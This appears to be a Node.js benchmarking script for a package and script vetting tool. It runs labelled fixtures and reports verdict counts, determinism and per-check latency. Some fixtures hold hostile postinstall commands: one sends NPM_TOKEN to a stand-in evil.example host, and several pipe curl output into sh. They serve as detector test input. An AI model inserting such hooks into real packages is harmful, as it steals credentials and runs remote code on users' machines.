// Measure vetgate fixture-set verdict counts and per-check latency.
// Run with: node scripts/measure-latency.mjs
// Prints real measured numbers for the README and BUILD-REPORT.
import { performance } from "node:perf_hooks";
import {
  vetAction,
  vetPackageContents,
  vetScriptContent,
} from "../dist/vet.js";

function pkg(overrides = {}) {
  return {
    name: "my-benign-pkg",
    version: "1.0.0",
    packageJson: { name: "my-benign-pkg", version: "1.0.0", license: "MIT" },
    files: {},
    ...overrides,
  };
}

const fixtures = [
  ["benign package", () => vetPackageContents(pkg())],
  ["benign postinstall echo", () =>
    vetPackageContents(pkg({
      packageJson: {
        name: "my-benign-pkg", version: "1.0.0", license: "MIT",
        scripts: { postinstall: "echo done" },
      },
    }))],
  ["exfil package", () =>
    vetPackageContents(pkg({
      name: "exfil-demo-pkg",
      packageJson: {
        name: "exfil-demo-pkg", version: "1.0.0", license: "MIT",
        scripts: {
          postinstall:
            "node -e \"fetch('https://evil.example/collect', { body: process.env.NPM_TOKEN })\"",
        },
      },
    }))],
  ["download-execute package", () =>
    vetPackageContents(pkg({
      packageJson: {
        name: "my-benign-pkg", version: "1.0.0", license: "MIT",
        scripts: { postinstall: "curl https://x.example/install.sh | sh" },
      },
    }))],
  ["typosquat reactt", () => vetPackageContents(pkg({ name: "reactt" }))],
  ["react itself", () => vetPackageContents(pkg({ name: "react" }))],
  ["missing license", () =>
    vetPackageContents(pkg({ packageJson: { name: "my-benign-pkg", version: "1.0.0" } }))],
  ["clean action SHA", () =>
    vetAction("actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683")],
  ["mutable action v4", () => vetAction("actions/checkout@v4")],
  ["latest action", () => vetAction("actions/checkout@:latest")],
  ["untagged action", () => vetAction("actions/checkout")],
  ["benign script", () =>
    vetScriptContent({ url: "https://x.example/ok.sh", text: "echo hello\ngrep foo bar\n" })],
  ["malicious script", () =>
    vetScriptContent({ url: "https://x.example/bad.sh", text: "curl https://x.example/install.sh | sh\n" })],
  ["hidden-unicode script", () =>
    vetScriptContent({ url: "https://x.example/h.sh", text: "echo hello\u200Bworld\n" })],
  ["outbound-url script", () =>
    vetScriptContent({ url: "https://x.example/u.sh", text: "echo see https://docs.example/guide\n" })],
];

const counts = { ALLOW: 0, DENY: 0, REVIEW: 0 };
for (const [label, run] of fixtures) {
  const verdict = run();
  counts[verdict.verdict]++;
  console.log(`${verdict.verdict.padEnd(6)} ${label}`);
}

// Determinism: same input twice, verdicts identical except checkedAt.
const detInput = pkg({
  name: "exfil-demo-pkg",
  packageJson: {
    name: "exfil-demo-pkg", version: "1.0.0", license: "MIT",
    scripts: { postinstall: "curl https://x.example/i.sh | sh" },
  },
  files: { "index.js": "module.exports = 1;\n" },
});
const strip = (v) => {
  const c = JSON.parse(JSON.stringify(v));
  delete c.manifest.checkedAt;
  return JSON.stringify(c);
};
const deterministic = strip(vetPackageContents(detInput)) === strip(vetPackageContents(detInput));

// Latency: time every fixture check, 200 passes over the set.
const timings = [];
for (let pass = 0; pass < 200; pass++) {
  for (const [, run] of fixtures) {
    const start = performance.now();
    run();
    timings.push(performance.now() - start);
  }
}
timings.sort((a, b) => a - b);
const median = timings[Math.floor(timings.length / 2)];
const p95 = timings[Math.floor(timings.length * 0.95)];
const mean = timings.reduce((a, b) => a + b, 0) / timings.length;

console.log(`\nfixtures: ${fixtures.length} (ALLOW ${counts.ALLOW}, DENY ${counts.DENY}, REVIEW ${counts.REVIEW})`);
console.log(`determinism: ${deterministic ? "identical except checkedAt" : "MISMATCH"}`);
console.log(`checks timed: ${timings.length}`);
console.log(`median: ${median.toFixed(3)} ms`);
console.log(`p95: ${p95.toFixed(3)} ms`);
console.log(`mean: ${mean.toFixed(3)} ms`);
